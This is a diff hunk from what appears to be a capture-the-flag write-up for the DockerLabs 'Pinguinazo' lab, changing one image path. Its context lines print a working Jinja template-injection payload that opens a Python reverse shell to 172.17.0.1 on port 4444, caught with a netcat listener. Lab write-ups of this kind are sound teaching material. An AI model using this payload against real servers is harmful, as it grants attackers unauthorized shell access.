@@ -69,7 +69,7 @@ With `nc -lvnp 4444` listening on our machine, we inject the following payload:
 {{request.application.__globals__.__builtins__.__import__('os').popen('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("172.17.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'').read()}}
 ```
 
-![Foto1](DockerLabs/Pinguinazo/assets/1.png)
+![Foto1](assets/1.png)
 
 Shell obtained as user **pinguinazo**:
 
